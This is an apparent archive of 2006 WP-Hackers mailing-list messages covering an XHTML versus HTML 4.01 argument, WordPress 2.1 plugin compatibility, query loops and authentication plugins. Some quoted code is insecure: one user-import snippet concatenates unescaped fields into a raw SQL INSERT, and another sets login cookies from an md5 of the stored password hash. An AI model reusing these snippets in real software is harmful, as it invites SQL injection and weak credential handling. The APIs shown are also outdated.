and the rest of the world becomes XHTML-compliant, you're going to have to
do a lot of work just to make it work with XHTML.

HTML 4 has many issues, it's not as strict (even HTML 4.01 STRICT), and
there is no point to *going back to it* after already switching to
XHTMl-compliant code.

AS a matter of fact though, EVEN if you were to use HTML 4.01 strict, *XHTML
STILL VALIDATES*
Here:
http://validator.w3.org/check?uri=http%3A%2F%2Fneosmart.net%2F&charset=%28de
tect+automatically%29&doctype=HTML+4.01+Strict

Basically, revalidating my XHTML-compatible homepage as HTML 4. The only
error is the XML-descriptor at the top - something that HTML doesn't use.

So if XHTML is 100% backwards-compatible with HTML 4 - why the hell would
you take a giant step back and make it ONLY compatible with HTML 4 and kill
off XHTML compatibility?


I had "innerHTML" hell with my main site, until I figured out how to fix
that stuff.

That ENTIRE article you linked me to has absoloutely nothing to do with our
topic. All it says, basically, is that it's "wrong" because it won't
necessarily be 100% compatible when you change the mime type to XHTML. 

Read it carefully. The Executive Summary is a perfect explanation:

 1. Authors write XHTML that makes assumptions that are only valid for
    tag soup or HTML4 browsers, and not XHTML browsers, and send it as
    text/html. (The common assumptions are listed below.)

 2. Authors find everything works fine.

 3. Time passes.

 4. Author decides to send the same content as application/xhtml+xml,
    because it is, after all, XHTML.

 5. Author finds site breaks horribly. (See below for a list of
    reasons why.)

 6. Author blames XHTML.


We have number 1 down just fine, and 2, and 3.
So long as you *don't* do number 4, ABSOLOUTELY NOTHING WRONG OR BAD OR
HARMFUL HAPPENS.

That's the important thing. There is NO DISADVANTAGE in using XHTML and
sending it as HTML. It's an article that tries to make a problem out of
nothing. Or at least you're inferring the wrong stuff from it. The ONLY
PROBLEM is when you try to send it as XHTML. So long as your sending it as
HTML (as we're doing), there are NO issues.

The only real issue in that article:

* XHTML documents that use the "/>" notation, as in "<link />" have
   very different semantics when parsed as HTML4. So if there was to
   be a fully compliant HTML4 user agent, it would be quite correct to
   show ">" characters all over the page.

   For more details on this see the third bullet point in the section
   entitled "The Myth of "HTML-compatible XHTML 1.0 documents".


Which is correct. But as they said, only a "fully compliant HTML4 user
agent" and there is none. Every single browser out there (I've checked)
understands and circumvents this on its own.

My point is, HTML4 is old and decrepit. Whether in a year or 5, we *will*
switch to pure XHTML. Using HTML4 now simply means having to do a lot more
work later. If we can continue to use our XHTML-as-HTML implementation
without problems (this is all "theoretical" problems in the here and now, no
actual, real-world issues) and ease the transition later, whyever not?

One more thing: the author of that document couldn't have made more clear
his/her personal feelings about XHTML:
* HTML 4.01 contains everything that XHTML 1.0 contains, so there is
   little reason to use XHTML in the real world. It appears the main
   reason is simply "jumping on the bandwagon" of using the latest and
   (perceived) greatest thing.


Obviously the author thinks XHTML is useless and a "fanciful" standard. BS.
As is mentioned, this document WAS WRITTEN IN 2002!!! THINGS CHANGE.

Today, XHTML *IS* correct. Browsers have improved. They won't render this
stuff wrong. XHTML is the way to go, and HTML4 is dead. Think about it -
2002?! 


(erm.. I kinda got carried away, please, no offense intended to anyone
pushing this idea on the list... I just feel strongly about taking huge
steps backward :)

So, let me get this straight: you want to use XHTML-as-`text/html` now
to lower your switching costs to "pure XHTML" later?

> So long as you *don't* do number 4, ABSOLOUTELY NOTHING WRONG OR BAD OR

To "switch to pure XHTML" *means* serving the documents as
`application/xhtml+xml`. i.e., it means #4.

Yes, you won't face any switching costs unless you switch. Nothing
wrong or harmful will happen until you switch. That's why it's called
a switching cost.

The point of Hixie's piece is that using XHTML-as-`text/html`
introduces new costs. If you want to have a painless upgrade path,
it's not the way to go.

How, specifically, is he wrong?

The original message *was* talking Web standards. Relying on every
user-agent being broken in the same way has nothing at all to do with
standards. "Validation" is irrelevant if proper display of the
document relies on it being rendered incorrectly.


Anyway, I'm not trying to convince anyone to change. I'd have to clean
my own house first. I just wanted to reiterate that, yes,
XHTML-as-`text/html` can be harmful.

Most of the mail lists I subscribe to specifically state that they

bringing up the issue.  One list is going atomic over the issue. (Most

Not a biggie.  Just wanted to make folks aware if it was an issue.

Automattic makes the WP-Hackers mailing list archives available to the
public as it is... :)

I actually unsubscribed from the Dodgeit address due to some of the
WP-Hackers' members privacy concerns.

With the changeover from 1.5 to 2.0 last year, someone (Matt, I  
believe) had a Codex page with a plugin compatibility list. With the  
run-up to the 2.1 release, I was wondering if anyone had a list of  
plugins that have passed the mustard test and those that need to be  
tested. I know for us, I've got an inventory of plugins that I'll  
want to check and wouldn't mind updating the general community with  
my findings.

I have about 50 or 60 plugins installed on my WP, I'd be happy to list which
worked, which didn't, and any fixes I used - I was just waiting for 2.1 to
go final - and now it's almost there.

Good idea btw, +1 :)

All the plugins I used work fine under 2.1.

What changed that'd break plugins in 2.1? 2.0 -> 2.1 is a lot less of a
difference than 1.5 -> 2.0.

50-60?? Holy frick. You're like the blogger I know who has 67 Firefox  
extensions loaded. :-)

Say, do you have a WP plugin that will water my dog for me? I could  
use that one...

On a serious note, I guess I'm not referring so much to "how to fix  
them" as that won't be of nearly as much use to users as "did the  
author fix them". If you have a list somewhere, feel free to send it  
along to me and I guess when the powers that be say that we're ready  
for testing, start a codex page. I'll be happy to add to it.

My findings indicate that many plugin authors still like to use the  
db variabls like $tableposts or $table_prefix instead of $wpdb- 
 >posts, $wpdb->prefix. Those are major issues with a lot of plugins.  
I also know podPress is broken under 2.1 but I let the author know of  
that the other day and he is working toward a fix apparently.

I didnt see anywhere obvious to grab the 2.1 beta code, so I yanked down
the latest from svn. I there a branch name I should be using?

in any case, Im going to start updating the code to support the new
naming convention, but my guess is that it will still complicate support
for my WP1.5 users.

Thanks for posting that Michael :) Yeah, I had it updated the day of this thread, but really haven't added too much to it lately, just been busy sigh. :(
http://wordpress.org/support/topic/80110?replies=17

I was pretty much hoping that a lot of other people would add, contribute to that 2.1 alpha3 Plugins list as they could... I've also updated the Get Recent Comments plugin myself.. However, it might need further testing.. ?
http://wordpress.org/support/topic/80110?replies=17#post-480379

You can see it in action on my 2.1 alpha3 test blog if you'd like:
http://21.spencerp.net

You could grab the plugin code here:
http://21.spencerp.net/plugin-txt/get-recent-comments.php.txt

It *should be* fine..  The plugin author asked for a DIFF of the changes from the original, but, I never made a DIFF before so.. not sure on that either.. :( 

All I know is, I just basically made the following database call changes:

The following replacements need to be made:

$tableposts  (changed to: => $wpdb->posts
$tableusers  (changed to: => $wpdb->users
$tablecategories  (changed to: => $wpdb->categories
$tablepost2cat  (changed to: => $wpdb->post2cat
$tablecomments  (changed to: => $wpdb->comments
$tablelink2cat  (changed to: => $wpdb->link2cat
$tablelinks  (changed to: => $wpdb->links
$tablelinkcategories  (changed to: => $wpdb->linkcategories
$tableoptions  (changed to: => $wpdb->options
$tablepostmeta  (changed to: => $wpdb->postmeta

You must make sure that $wpdb is declared global. This will need done throughout ANY and ALL of the wp-forum plugin's files.

I hope this helps, and hopefully others will add their working plugins to the list .. ;) :)

Would you be up for writing a 2-3 paragraph post for the WP.org dev blog 
giving tips for plugin authors to update their plugins for 2.1 compat?

Yes. One of the things I'm arguing is that WordPress ought to be
ensuring that your markup validates. The fact that you'd have to spend a
lot of time making sure your markup validates is a good indication that
something is broken with the current WordPress design.

If browsers ever emerge that cannot render HTML 4.01 Strict, then there
are programs that can convert from HTML to XHTML 1.0 Strict, like Tidy.
And if WordPress develops an engine for serializing content to multiple
document formats, serving XHTML instead would involve no additional work
for the author. 

Of course, even real XHTML 1.0 Strict is a bit pointless compared to
compound document formats, XHTML 2, and WHATWG's XHTML serialization.
Moving from either HTML 4.01 or XHTML 1.0 to those may well involve
author work, because all three introduce new semantics. But developing
an engine to serialize content to multiple document formats should help
minimize such work.

Can you offer an example of such "strictness" benefiting visitors?

Even if it validated completely, that wouldn't help since the same
markup means something different in HTML 4.01, due to different
treatment of />.

XHTML 1.0 is in no sense 100% backwards-compatible with either HTML 4.01
or even our broken user agents. Instead, a certain subset of XHTML will
work most of the time because of bugs in our user agents.

What evidence do you have that using HTML 4.01 would be a "giant step
back"? Anyhow, XHTML-devotees (in which party I include myself) should
be arguing for a system that can serialize to both, not a system that
churns out faux XHTML. Because we want to take a leap forward.

You began this email by claiming (wrongly) that when mainstream browsers
can parse and render application/xhtml+xml, it would involve a lot of
work to switch content from HTML to XHTML. But now you seem to be
suggesting that we should never switch to application/xhtml+xml, and
that we ignore the view of the W3C HTML working group that we should
serve that MIME type to supporting browsers:

http://www.w3.org/TR/xhtml-media-types

So which is it?

Internet Explorer 7 will still be around in 5 years time. While
people /might/ start making more use of real XHTML if Internet Explorer
8 adds support, it is unlikely that that commercial sites will be able
to avoid still sending some content as text/html.

It's faux XHTML that is "old and decrepit". HTML 4.01 became a
recommendation in December 1999. XHTML 1.0 became a recommendation a
month later in January 2000. But since then we've seen a new version of
XHTML which MUST not be served as text/html: XHTML 1.1 (May 2001).
Compound documents including SVG or MathML (i.e. the only documents
which at this juncture will actually gain from using XHTML) should use
+xml media types not text/html.

XHTML 1.0 itself, and the HTML compatibility appendix especially, were
intended as transitional technologies. The editors certainly didn't
envisage that in 2006 people would be fighting a rearguard battle to
make this underspecified hack into the mainstream web markup. They
thought people would move onto an XML-based markup world. Systems like
WordPress are standing directly in the way of the transition, while
talking up their standards compliance. XHTML has been turned into a mere
gimmick, at the expense of future authors and readers.

Now the race is on to replace XHTML 1.1 with XHTML 2 or Web Applications
1.0. Serving faux XHTML ensures WordPress will be in no position to move
to either.

They're should be tangible benefits to balance "theoretical" problems.

Note the document says that "It has since been regularly updated to
correct errors that have been brought up in various mailing lists and
other discussion forums. As of late 2004, it is still just as relevant
as when it was originally written." What exactly do you think has
changed since late 2004?

Sorry, this was too vague for me to work out what you mean. Which XHTML?
Correct how? Improved how? What is "this stuff"? And why do you think
representatives from Opera, Mozilla, and Apple are working on a new HTML
specification, and even the W3C is getting back in on the act:

Definitely no offence taken. :) I feel strongly about these things too. 

But I'm left a little bit unclear about exactly what you're advocating,
and still more unclear about /why/. You don't seem to have any
particular use for XML-based markup, otherwise you'd be pushing for
alternatives 1) or 2). The only advantages of faux XHTML you've
suggested are "strictness" and novelty. 

Please tell us, what need of yours would not be met by /either/ a
"stricter" lint checker for HTML 4.01 Strict or by WHATWG's HTML
serialization?

Some things I've seen trip up plugins and themes:

* There is no longer a linkcategories table.  (Affects several themes)
* There is now a post_type field for distinguishing pages and posts.
* NOW() is gone from all queries.  Future posts have their own post_status.

Thanks Ryan. If anyone else has anything that may have not been  
touched on, feel free to post them. I'll work on a post in the next  
few days. I think I have a decent grasp on most of the stuff but more

I have gotten podpress nearly up to date and ready to be compatible with
2.1.

The one thing I still cant fix is my CategoryCasting support.
It relies on the is_category(), single_cat_title() and
get_the_category() functions which used to work in the RSS2 feed, but no
longer do.

In WP 2.0.x I could put  http://www.mysite.com/?feed=rss2&cat=2 which
would work fine. Now when I do this, the is_category() returns false and
basically Im unable to make things work.

Anyone familiar with what changes have been made in the categories code?

btw, Im very happy the edit_category_form hook I requested was added,
which only makes me more bummed that is_category() and the others have
stopped working

Message-ID: <309c2db70612051730g17a5df85wc0bf89273045794b@mail.gmail.com>

I am currently using this code to query specific posts by month and year in
a page template, so I have to repeat this query 12 times for every year
everytime the page is loaded:

<?php query_posts('cat=2&year=2006&monthnum=1');
if ($wp_query->post_count >= 1)
{
?>

<---do stuff-->

<?php
 }
?>

I am worried that this is too many queries. Is there a better way of doing
this? Perhaps something along these lines:

<?php query_posts('cat=2&year=2006');
if ($wp_query->month_num = 1) && ($wp_query->post_count >= 1)
{
?>

<---do stuff-->

<?php
 }
?>

I know month_num won't work but is there any way of getting the month number
so I can pass it in the PHP if statement? That way I only have to run one
query.

Thanks

I'd do something like this:

<?php
function in_between_months($new_month) {
	echo '<hr />';
	echo '<h2>' . $new_month . '</h2>';
	return $new_month;
}

// query all your posts here
query_posts('cat=2&showposts=99999'); // 99999 = 'all posts',  
essentially...

$last_month = 0;
while ( have_posts() ) : the_post();
	$this_month = the_time('Y-m');
	if ( $last_month != $this_month ) {
		$last_month = in_between_months($this_month);
	}
	the_title();
	echo '<br />';
endwhile;
?>

So basically, you keep track of the year/month of the last post  
shown, and monitor for changes, executing in_between_months() when it  
changes.

Speaking of 2.1 plugin compatibility, is anyone aware of any broken

For the past couple of months I've either cut & paste HTML into the post

from BlogJet - which worked fine with 2.1 in the past - and received this
error:

I don't think this would be a core issue but it may be -
call_user_func_array is used in the following general areas in 2.1 -
Calling Plugin functions for filters/actions, The Walker Classes,
Capabilities, Cron

More detail on the error message returned (like the full text) would help
debug it before raising a trac ticket as it may well be a plugin issue.

Sounds like a bug.  I'll give it a look.  Would you mind creating a

I have done more poking around and finally just stopped using an if
around is_category() since it didnt seemed to work. I just go right into
 using get_the_category() and when it was in a category it would return
the array. So Im still not sure what was going on there, but podpress is
now working in the latest wordpress svn code

btw, no one has yet answered the question about there being a branch for
the upcoming 2.1 release. Im currently testing against the HEAD code.

Hi Dan,

Trunk's head is the correct place to be working/testing for now.

Thanks so much Mark, I really appreciate you taking the time to help me out.
The problem is my <--do stuff--> doesn't play nice with your code, here is a
sample of the full code I am using to display the posts,  all 12 months are
not included because it would be extremely long, just the first 2 from 2006
and 1 from 2005:

<div class="entries">
                    <h5><a name="06" id="06">2006</a></h5>
                    <?php
                    query_posts('cat=2&year=2006&monthnum=1');
                    if ($wp_query->post_count >= 1)
                    {
                    ?>
                        <dl>
                            <dt><?php the_time('F') ?></dt>
                            <?php if (have_posts()) : while (have_posts()) :
the_post();?>
                            <dd><a href="<?php the_permalink() ?>"
rel="bookmark" title="<?php the_title(); ?>"><span
class="comments_number"><?php comments_number('0', '1', '%', '');
?></span><span class="date"><?php the_date('j','',''); ?></span><?php

                            <?php endwhile; endif; ?>
                        </dl>
                    <?php

                    {
                    ?>
                        <dl>

                    ?>
              <p><a href="#content">back to top</a></p>
</div><!--end entries06-->

<div class="entries">
                    <h5><a name="05" id="05">2005</a></h5>
                    <?php

                            <?php if (have_posts()) : while (have_posts()) :

So I need to be able to output a <dl> for every month of 2006 and keep in
the 2006 DIV, and then output a <dl> for every month of 2005 and keep it in
the 2005 DIV, and so on and so on. Right now the method above works but I am
querying the database 24 times every time the page is loaded, and the number
will keep going up as time goes on.

Any more help would be greatly appreciated.

Thanks Again,
Andy

You just need to take my method and make it apply to year changes as  
well as month changes.  For year changes, close two <dl>s and start  
the one for the new year.

In pseudo code:

firstyear = true;
firstmonth = true;

foreach ( posts ) {
	if ( new_year() {
		if ( !firstyear) {
			</month>
			</year>
		}
		firstyear = false;
		<year>Yearname
	}
	if ( new_month() ) {
		if ( !firstmonth )
			</month>
		firstmonth = false;
		<month>Monthname
	}
	<post>
	POST STUFF
	</post>
}
</month>
</year>



something like that.

Mark,

Thanks again so much for your help. I looked at the pseudo code and I am
thoroughly confused. My knowledge of PHP is very limited. It took me quite
awhile to figure out how to properly construct the PHP IF statement I am
using now. I know it is a pain but I may need more specific code to figure
it out. I apologize for my lack of PHP knowledge, but I am trying to learn
as fast as I can right now while figuring this out.

Thanks Again,

Andy

When trying to view the source for plugins at wp-plugins.org, I get
the message "HTML preview not available."

Could someone restore that feature?  It's convenient to be able to
view the source of plugins without having to download them.

I don't have a solution for that, but I do have a workaround:

http://svn.wp-plugins.org/plugin-slug/trunk/plugin-file.php

That'll get you a plain text version in your browser.  Not sure why  
the preview went away... I have a feeling that a Trac upgrade did  
it.  Because of the way those previews were set up, large files would  
freeze up Firefox.  They may have axed them to avoid that... but I'm  
just guessing here.

Message-ID: <4579ADE7.8080600@kuykendall.org>

I have been in the process of updating podPress to support WP2.1 and I
have to let you all know that Im very impressed in a number of areas.

I do have that big with the is_category() but it was easy enough to work
around, so its not preventing me from accomplishing anything.

There are some very cool new changes in the code that I wanted to that
the developers for. The wp-feed.php was always a limiter for me and I
had to include a replacement version of this for my users up till now.
Now, with no changes to any of the files included with wp2.1 I can have
alternate feeds like this

standard rss feed, includes all posts
http://dev21.mightyseek.com/?feed=rss2

podcast only feed. filters out posts without a media file enclosure
http://dev21.mightyseek.com/?feed=podcast

since WP2.1 still has atom 0.3 format here
http://dev21.mightyseek.com/?feed=atom

I added in atom 1.0
http://dev21.mightyseek.com/?feed=atom1

In addition, my request for a hook in the categories admin page now
allows my category casting support to work out of the box.

Now if only someone will add in the one liner I need in
wp-commentsrss2.php then I will be down to a very limited set of
optional files

It was a trac upgrade.  The new version of trac requires some additional 
components to generate the previews.  I will see what I can do about 
getting those installed and bringing the preview back.

Unless there are any objections, that'll probably go in for 2.1  We

I briefly tried to recreate that the other day and couldn't.  I'll give

Subject: [wp-hackers] Memory Space Changed Simultaneously
Message-ID: <000001c71c76$b7409490$25c1bdb0$@net>

What happens in PHP if a single address in memory attempts to be changed at
the very same exact time/cycle?

I have a problem with an auto-prepended file, it's the request_uri fix I
developed for WP users earlier, and it attempts to write to the global
$SERVER_[REQUEST_URI]

Since it's an auto-prepend file, the likelihood of simultaneous access is
very high, and under load I see this error:

Error using $this when it's not a context

Or something like that, and my code is very straightforward and simple, I
suspect this is what's happening.

May I'm not googling the right terms, but I can't find if
simultaneous-access crashes PHP or not. Does anyone know what happens when
there's a "race" to change the same memory address in PHP, and more
importantly, how to avoid it?

This is (or shold be) impossible. PHP and the core libraries are 
threadsafe, so unless you are using the shared memory facilities or 
spawning threads without semaphoring your resources, I'm not sure what 
could be causing the problem.

I guess this is what is causing your problem, but I don't know what you 
are referring to :) could you elaborate? What does auto-prepend mean?

Subject: [wp-hackers] Pluggable authenticaton
Message-ID: <1165833388.6410.21.camel@localhost>

Hello to all.
	I'm working at a pluggable authentication plugin, but I'm stuck with
session handling.

My external app is creating a single cookie with crypted session hash.
But WP is needing two cookies: one for username and another for
password.

I've tried to plug these functions:

wp_login:
does the outside authentication, setting outer cookie. returns bool

wp_get_cookie_login, returns the outer cookie created before if exists,
false otherwise.

wp_setcookie, returns the outer session cookie

wp_clearcookie, deletes the outer cookie

wp_auth_redirect, checks for the outer cookie, if empty redirect to
login.

I'm trying to let WP make the check on the outer session but with no
result. I'm stuck into wp-login.php looping redirect, because can't find
the correct cookie session.

Subject: [wp-hackers] Plugins registering "urls" 
Message-ID: <457D885C.9030105@sacharis.no>

Hi,

I was wondering if it was possible to register an URL (permalink,
page..) from a plugin?

I've seen lots of plugins that require the user to add a blank page, and
specify in the plugin-settings which page the user wants to connect the
plugin to, which then filter ?the_content? based on that input.


Cheers,

Harald Nesland

You can hook into the rewrite system, yes. No documentation exists really,
so you'll just have to check out the class. It's somewhat self-explanatory
if you know your PHP.

Thanks for the reply,

Auto-prepend is an option is php.ini that allows you to "auto-include" any
file of your choice to _every single_ php file served.
I use this feature to include a quickie-script that fixes the value of
$_SERVER['REQUEST_URI'] on IIS servers to be exactly like that on LAMP -
it's LGPL'd code.
I wrote about it before here: http://neosmart.net/blog/?p=291

Anyway, the code is very clean and bug-free (it's virtually hello-world
easy), and only under times of really heavy load, I get that error with
reference to the auto-include .inc file. The only thing I can think of is
that it's a memory-sharing/access write violation, because afterwards PHP
dies (it keeps giving that error), until IIS is restarted.

There's some action rewrite where I can tell for example to rewrite 
http://myblog.tld/wp-content/plugins/myplug/myplug.php?doin=something&with=care
that will rewrite to: http://myblog.tld/something/careful ?

Here's some sample code that I had tucked away.  Hope it helps.  This  
could definitely be easier.

No guarantee on this, by the way... I just hacked PATHINFO vs  
mod_rewrite support in at the last second, and this doesn't have any  
fallbacks for people without pretty permalink of one kind or another,  
so you'll have to include that in your code.

Is there online some good example of plugged authentication plugin to

Once in a lifetime shot, there! Oh, and... the Vows and Ceremony were set to
publish to the future (live, as the event was unfolding).

Okay, so this is not a very hackerish post - but I'm so excited, I just had

I have been working on a plugin[1] which extends authentication for  
WP as well. I find the local wordpress user ID, using whatever  
method, grab the $user object, and do a login against wp_login()  
mimicking the method used when logging in with cookies. If that  
works, I set both the username and password cookies. This is all done  
using the same method as wp-login.php, by hooking the wp_authenticate  
hook and die()ing myself.

					$user = new WP_User( $matching_user_id );
					if( wp_login( $user->user_login, md5($user->user_pass), true ) ) {
						do_action('wp_login', $user_login);
						wp_clearcookie();
						wp_setcookie($user->user_login, md5($user->user_pass), true,  
'', '', true);
						$this->action = 'redirect';
						if ( !$user->has_cap('edit_posts') ) $redirect_to = '/wp-admin/ 
profile.php';

					} else {
						$this->error = "Extended auth valid, but WP login failed.";
						$this->action = 'error';
					}

Hi to all,
	is there a less dirty, working, and different by following method to
add uses into wordpress having a known user, pass and email?

$wpdb->query("INSERT INTO ". $wpdb->users . " (user_login, user_pass,
user_email, user_registered, user_url, user_nicename, display_name)
VALUES ('" . $username . "', '" . $vb_login['password'] . "', '" .
$vb_user['email'] . "', '" . date('Y-m-d H:i:s', $vb_user['joindate']) .
"', '" . $vb_user['homepage'] . "', '$username','$username') ");

$lastid = $wpdb->insert_id;

$usermeta['wp_capabilities'] = 'a:1:{s:10:"subscriber";b:1;}';
$usermeta['wp_user_level'] = 1;
$usermeta['rich_editing'] = 'false';
foreach ($usermeta AS $k => $v ) {
	$wpdb->query("INSERT INTO ". $wpdb->usermeta . " (user_id, meta_key,
meta_value) VALUES ('$lastid','$k','$v')");
}

As registration functions, these are not always defined in WordPress,
so you may need to include the wp-includes/registration-functions.php
or wp-includes/registration.php file, depending on your WP version.

Registration functions aren't pluggable, so could give errors if already
declared.

use require_once() to ensure the file is only included once.

No, don't do any include/require-ing of that file. Hook around init to
where they will be defined regardless of whether they were included
like normal or if they were added by a plugin.

Like normal, wp-includes/registration.php is -not- included, since it's 
not used very often. wp-login.php require_once()'s registration.php[1] 
as it's needed, as does wp-admin/users.php[2] This doesn't happen 
anywhere near init. Anyone replacing the functionality of wp-login.php 
or the Users admin panel must do a

   require_once( ABSPATH . WPINC . '/registration.php');

My mistake, I was thinking they were among the functions that were
pluggable via pluggable.php. Replied too hastily

At some point, RSS feeds generated by WordPress 2.1 Trunk would include the
necessary code to indicate the categories that an article (entry in the RSS)
was a part of.

I'm not sure if that's there in 2.0, but I know it's gone from the current
2.1 Trunk.

Does anyone have any idea what happened to that feature? With IE7 now a
default Windows-Update Install, it's a very nifty feature to have. IE7 has
on-the-fly category support for feeds, you can key-in the category search
terms and dynamically sort/limit a feed by category.

In the past, my RSS feed would contain the names of all used Categories and
Tags (UTW) as entry categories in the RSS/Atom - I'm wondering if anyone has
any idea what happened to that?

Well, it's not for me :S

http://neosmart.net/blog//feed

(nevermind the extra slash, that's so you don't get redirected to
feedburner)

I disabled my own CompleteRSS plugin (which I know for a fact doesn't
interfere), and tried switching between Summary/Full Post models, it doesn't
make a difference.

I'm re-enabling Full-Posts via CompleteRSS in a couple of minutes, so here's
an excerpt of the RSS with full post enabled and CompleteRSS disabled:

If I keep this up, Akismet is going to label me a spammer! <G>

Just a quickie update: I've emailed Christine, but I've found a workaround
that suggests that this is a WP 2.1 bug or plugin-breaker.

Viewing the RSS 2.0 feed with UTW installed = No categories in feeds
Viewing the Atom 0.3 feed with UTW installed = Categories in feeds like
always

Just some food for thought and a quick workaround for anyone currently using
WP 2.1 and relying on the excellent UTW for tagging.

Nevermind my last message, I've pinned it down.

UTW. For some reason, it breaks category-listing in RSS feeds in 2.1.. I'm
emailing Christine right now (is she subscribed to WP-Hackers?), so it's not
a 2.1 bug, unless of course, there's some glitch in 2.1 that screws up the
otherwise picture-perfect UTW support.

Forgive me ignorance, but 2.1 isn't even beta yet, why the rush to have a
plugin author *fix* a plugin for a version that's not final?

No rush, just giving the author and the WP 2.1-users a heads-up.
UTW is probably one of the top-ten most popular plugins, esp. with serious
bloggers. If I were the author, I'd want to know :)

And as with many plugin authors, they like to wait until something is more
set in stone.  When you say "the WP 2.1 users", I trust that those that are
using 2.1 and subscribe to this list fully understand the caveats of using
an alpha release, and do not expect full function of all plugins for it.

Forgive me if I sound sharp, but after a recent thread about "noise" in the
support forums, and the need for intellectually stimulating conversation on
wp-hackers, I find a thread of this nature on wp-hackers and not wp-testers
as noise.  I monitor this list as a means to better know about WP, and to
better be able to assist in the forums.  There have been numerous threads
regarding plugins and compatibility with alpha/beta versions of WP, and
since my time around, the answer has always been the same as the one I've
already stated.  I'm not saying sharing the info with the author (in this
case Christine, who has her own support forum for the plugin) is a bad idea,
I just wonder if wp-hackers is the proper place for it.

This not intended as a flame or to rehash the previous thread, just an
observation.

I understand what you're saying - I originally believed that this was
"dropped functionality" and was inquiring as to the reasoning behind that.
Once I learned it _wasn't_ dropped, I guess the original purpose of the
thread was fulfilled - got carried away apparently ;)

WP 2.1 is looking strong for a release after the holidays, plugin 
authors should begin updating their plugins immediately, and there is a 
post on the WP dev blog about this.

I saw that, and who's to say that she/they are not now doing so.  But
expecting full functionality with the alpha release goes against what the
"average" user is told.

Perhaps someone could chime in to explain then the difference between
wp-testers and wp-hackers.  I filter my lists in a fashion so my inbox stays
somewhat manageable.  Meaning that wp-testers moves onto a place I can
easily catch up when I have time.  I generally assume wp-hackers has more
pertinent content, and leave it in the inbox.

But getting threads such as this is, IMO, no different than threads like
"OMG MY SIDE BAR DROPPED" in the forums, which were hypercritically
criticized in a recent discussion on my suggestion of moving some of this
list to the forums.  At least in the forums, I can cruise right past a
thread title such as that if I'm not in the mood to say the same thing over.

Generally speaking, inquiring about plugins is one of the first questions
volunteers ask users in the forum when an apparent issue isn't easily
reproduced.  I'm not trying to be rude, but "computer guru" said in that
thread:

I wanted out. I found wp-hackers where we could discuss actually

There were several other declarations such as these.

My goal is not call anyone out, but to again point out the exclusive nature
of this list, and desire to find a way to include those "average" users, or
those not familiar with this list.

But I could be wrong...

You asked a question, and I gave you a succinct and accurate reply, but if
you really want the boring details, here goes:

WP-Hackers is for discussing code and ideas pertinent to the evolution and
future of WordPress. It's where we discuss/dissect code-ideas and the
metaphysics of blogging. Cool?

Keeping that in mind, my original thread to this list was asking for
clarification/reasoning behind the dropping of a feature from 2.1. Like I
said, I was "wrong" to continue the discussion here once I learned that it
_wasn't_ in fact dropped from 2.1.

Moreover, this is in keeping with the mood of the last couple threads
discussing which plugins work and leading up to Andy's (very useful) post in
the WP-Dev blog. If that doesn't qualify as WP-Hacker-compliant, I don't
know what is.

The *original question* was 100% wp-hackers content. The follow-up threads
were slightly OT. What more do you need? A written affidavit promising to
never go OT in a thread again?

At any rate, your complaints and this pointless email explaining the
reasoning behind my only too-obvious mistake are probably pissing
subscribers off more than the original question - esp. seeing as that was a
3-message-total, while this conversation over how evil my actions were (even
after I admitted it was a bit OT) have already taken-up twice that.

Sorry to clutter your inbox, I'm exiting this conversation now.

Just because I like to make sure my name is appropriate recognized  
(call me "elitist"), that post on WP Dev was from me, not Andy.  
Though Andy could have probably done a much better job than I did.

I remember about a year ago I was roundly smacked around for claiming  
that wp-hackers was not for plugin discussion. In fact, it is. It's a  
place where we can "hack" WordPress. If you [Mike] want only  
development of the core, then my recommendation is to subscribe to wp- 
trac instead.

OK, I'll bite... no it's not cool.  Why  are you (those you are associating
with in your we) so bloody special that you feel that this list is
specifically for "discussing/dissecting the metaphysics of blogging"?  I
didn't just start using WP, or start following it's development.  My
understanding, at least as it's described in the codex, the list is for "
Serious discussion that determines the future direction of the WordPress
codebase".  Not general blogging.  Not about using an alpha version of WP
for your everyday blogging.  You claim such experience, but from where I
sit, jumping to a conclusion about the latest build losing support for
categories in feeds while running plugins is a beginner mistake, not that
much unlike the one's you've mocked from the forums.  And I'm not a coder.

And for the record, whomever made that post, it was only  2 days ago.
Unless I've missed a discussion in this list, nothing has been mentioned
publicly about a release date.  My assumption was sometime after the
holidays, but that means more than a month.  Unless a beta is going to be
dropped out without much notice, and a final release was planned for mid
Jan.  But that's still a month for plugin authors/theme developers to
update.

The *original question* was 100% wp-hackers content. The follow-up threads

Thus my question about the difference between wp-testers, and  wp-hackers.
Also from the codex, "The wp-testers list is meant for people to discuss the
current nightly or alpha/beta version of wordpress. If you want to discuss
the latest nightly or a certain bug report left on the trac, feel free to
drop in."

At any rate, your complaints and this pointless email explaining the

count again.

while this conversation over how evil my actions were (even

I never said evil, please do not put words in my mouth.  I  went so far as
to say  it wasn't meant as a flame or meant as  a call out.  But facts are
facts.  If you can not stand by your  comments  that I quoted, then perhaps
that 's something you  need to reevaluate.

My point is, if some regular joe/jane had posted this in the support forums,
they'd immediately be directed to wp-testers, and possibly be considered as
noise.  Why should anyone else be different?  Why have wp-testers if that's
not the purpose?  And back to my thread earlier, why not just move all these
discussions to the forums in the first place?

That's not my impression of this discussion.  This was not about about
plugin discussion, or code.  I rarely read trac, as I barely can hack around
PHP.  I was under the (false?) impression the greater, more general
discussion of what was being done with the code was for this list.  Trac was
for the actual changes/suggested code fixes that were being implemented.

And on that note, I'm off to see Lucero.

Aaron> It's a place where we can "hack" WordPress. 
That's the problem.  That's NOT what this list is.  The name makes it sound
that way, but that's not it.

I have no idea what "the metaphysics of blogging are" but except that Guru's
description hits closer to home: "WP-Hackers is for discussing code and
ideas pertinent to the evolution and
future of WordPress. It's where we discuss/dissect code-ideas..."

When you visit the codex you see "The wp-hackers list is meant for people
interested in extending WordPress either through plugins or improvements to
the core code.", but many people interpret that as "The wp-hackers list is
meant for people interested in extending WordPress [for your own purposes]
either through plugins or improvements to the core code."

Matt's post makes the purpose clearer (despite the spelling):
"But for discussion of core WordPress development, the plugin API, and
building applications on top of WordPress, there really isn't a place yet.
No longer. I've set up a new mailing list specifically for advanced
WordPress development discussion..."
http://wordpress.org/development/2004/06/hackers/

This list should really be called "WP-CoreImprovement" and all of the
confusion and misplaced questions would go away.

The problem is that there still is a "whole in the discussion fora" <g>.
Hacking WordPress, to my mind, means bending WordPress to your will.
Changing it to get it to do what you want it to do.  And I agree that it has
nothing to do with what you can reach from the menus.  That's all definitely
support forum stuff.  Hacking WP means building custom solutions that don't
exist in the core or even just changing the core if it is already close to
what you want.  From that, of course, good ideas would be generated that
would make it into the core.  We don't really have a place for that sort of
discussion as questions about how to alter Wordpress's code are routinely
